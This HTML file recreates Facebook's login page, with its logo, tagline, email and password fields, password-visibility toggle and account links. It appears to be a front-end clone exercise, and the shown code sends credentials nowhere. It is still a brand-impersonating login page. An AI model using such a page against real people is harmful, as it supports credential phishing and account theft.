<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login</title>
    <script src=click.js></script>
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="images/fb.ico"
    />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div class="container">
      <section class="left">
        <div class="left-sys">
          <form action="fb.html" method="get">
          <img
            src="images/fbb.jpg"
            alt="facebook logo"
            height="138"
            width="261"
            style="position: relative; right:-21.5%; top:10%;"
          />
          <div class="desc" >
            <section class="left-sys">
            Facebook helps you connect and share
            <br>
            with the people in your life.
          </div>
        </div>
      </section>
      <section class="right">
        <div class="card">
          <input
            type="text"
            class="inn"
            placeholder="Email address or phone number"
          />
          <input type="password" class="inn" placeholder="Password" id="passwordInput" />
          <label for="togglePassword" class="toggle-password" onclick="togglePasswordVisibility()">
            <img src="images/visible.png" id="eyeIcon" width="24px height=24px">
          </label>
          <button class="inn login-btn">Log in</button>
          <a href="forgot_password.html" class="inn fgt-pass"
            >Forgotten password?</a
          >
        </form>
          <div class="inn hr"></div>
          <a href="create_account.html"
            ><button class="inn cna-btn">Create new account</button></a
          >
        </div>
        <div class="bottom-link-div">
          <p class="bottom-link">
            <strong style="cursor: pointer">Create a Page</strong> for a
            celebrity, brand or business.
          </p>
        </div>
      </section>

    </div>

  </body>
</html>
